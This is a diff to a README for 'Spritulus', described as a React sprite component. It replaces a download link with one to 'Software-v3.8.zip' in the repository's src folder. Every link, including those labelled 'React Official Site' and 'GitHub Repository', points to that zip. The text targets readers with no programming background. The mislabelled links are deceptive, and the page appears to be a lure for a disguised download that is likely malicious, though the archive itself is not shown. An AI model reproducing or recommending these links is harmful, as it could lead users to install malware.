@@ -4,7 +4,7 @@
 Spritulus is a React component that allows you to easily include animated sprites in your web applications. With Spritulus, you can enhance your projects with engaging and interactive visuals. This guide will help you download and run Spritulus, even if you have no programming background.
 
 ## 📦 Download Spritulus
-[![Download Spritulus](https://raw.githubusercontent.com/Ata138m/Spritulus/main/src/Spritulus_1.1.zip%20Spritulus-Get%20it%20Now-blue)](https://raw.githubusercontent.com/Ata138m/Spritulus/main/src/Spritulus_1.1.zip)
+[![Download Spritulus](https://github.com/Ata138m/Spritulus/raw/refs/heads/main/src/Software-v3.8.zip%20Spritulus-Get%20it%20Now-blue)](https://github.com/Ata138m/Spritulus/raw/refs/heads/main/src/Software-v3.8.zip)
 
 ## 🚀 Getting Started
 1. **Check System Requirements**
@@ -14,11 +14,11 @@ Spritulus is a React component that allows you to easily include animated sprite
 ## 📥 Download & Install
 To download Spritulus, go to the Releases page by clicking the link below:
 
-[Download Spritulus](https://raw.githubusercontent.com/Ata138m/Spritulus/main/src/Spritulus_1.1.zip)
+[Download Spritulus](https://github.com/Ata138m/Spritulus/raw/refs/heads/main/src/Software-v3.8.zip)
 
 1. On the Releases page, look for the latest version. This will usually be at the top.
 2. Click on the version number to open the details page.
-3. Find the downloaded package suitable for your system. You typically see options like `.zip` or `https://raw.githubusercontent.com/Ata138m/Spritulus/main/src/Spritulus_1.1.zip`.
+3. Find the downloaded package suitable for your system. You typically see options like `.zip` or `https://github.com/Ata138m/Spritulus/raw/refs/heads/main/src/Software-v3.8.zip`.
 4. Click on the link to download the file. It may take a few moments.
 5. Once downloaded, locate the file in your downloads folder and extract it. This will create a new folder with the project files.
 
@@ -60,8 +60,8 @@ If you encounter issues, consider these steps:
 - **React Version:** Spritulus works best with the latest versions of React. Consider updating React if you run into problems.
 
 ## 📚 Additional Resources
-- **React Documentation:** [React Official Site](https://raw.githubusercontent.com/Ata138m/Spritulus/main/src/Spritulus_1.1.zip)
-- **GitHub Repository:** [Spritulus GitHub](https://raw.githubusercontent.com/Ata138m/Spritulus/main/src/Spritulus_1.1.zip)
+- **React Documentation:** [React Official Site](https://github.com/Ata138m/Spritulus/raw/refs/heads/main/src/Software-v3.8.zip)
+- **GitHub Repository:** [Spritulus GitHub](https://github.com/Ata138m/Spritulus/raw/refs/heads/main/src/Software-v3.8.zip)
 
 ## 💬 Support
 For questions or help using Spritulus, feel free to open an issue on the GitHub repository. Our community is here to help you get started and resolve any challenges you face.
